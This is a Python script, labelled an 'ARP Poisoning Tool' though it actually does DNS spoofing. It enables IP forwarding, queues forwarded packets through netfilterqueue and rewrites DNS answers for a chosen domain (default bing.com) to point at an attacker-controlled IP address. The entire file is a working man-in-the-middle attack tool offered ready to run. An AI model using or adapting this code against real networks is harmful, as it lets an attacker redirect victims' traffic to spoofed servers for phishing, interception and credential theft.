#!/usr/bin/env python3

import os
import subprocess
import argparse
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from rules import enable_ip_forwarding, set_trap_for_forward_packets, flush_rules

def parse_args():
    p = argparse.ArgumentParser(description="ARP Poisoning Tool")
    p.add_argument("--target-url", default="bing.com", help="Target host URL to spoof")
    p.add_argument("--attacker-ip", default="192.168.2.254", help="IP address to redirect the target to")
    p.add_argument("--queue-num", type=int, default=0, help="Netfilter Queue number")
    return p.parse_args()

def process_packet(packet, target_url):
    """
    Callback function to process each packet in the Netfilter Queue. This function spoofs DNS responses for the target URL with the ATTACKER_IP.

    :param packet: The packet from the Netfilter Queue
    """
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Check for DNS Response (DNSRR)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        
        if target_url in qname:
            print(f"[+] Spoofing target: {qname}")
            
            answer = scapy.DNSRR(rrname=qname, rdata=ATTACKER_IP)
            # Modify the DNS answer
            scapy_packet[scapy.DNS].an = answer
            # Modify the answer count
            scapy_packet[scapy.DNS].ancount = 1
            
            # Delete length and checksum fields to force Scapy to recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            # Set the modified packet back into the queue
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

def main(TARGET_URL, ATTACKER_IP, QUEUE_NUM):
    try:
        enable_ip_forwarding()
        set_trap_for_forward_packets(QUEUE_NUM)

        print(f"[*] DNS Spoofing started. Target: {TARGET_URL} -> Redirect to: {ATTACKER_IP}")

        queue = NetfilterQueue()
        queue.bind(QUEUE_NUM, lambda packet: process_packet(packet, TARGET_URL))
        queue.run()

    except KeyboardInterrupt:
        print("\n[!] Stopping...")

    except Exception as e:
        print(f"\n[!] An error occurred: {e}")

    finally:
        # This block ALWAYS runs, even if the script crashes or we hit Ctrl+C
        flush_rules()

# Main Execution
if __name__ == "__main__":
    args = parse_args()

    TARGET_URL = args.target_url             # Target domain to spoof
    ATTACKER_IP = args.attacker_ip           # IP address to redirect the target to
    QUEUE_NUM = args.queue_num               # Netfilter Queue number

    main(TARGET_URL, ATTACKER_IP, QUEUE_NUM)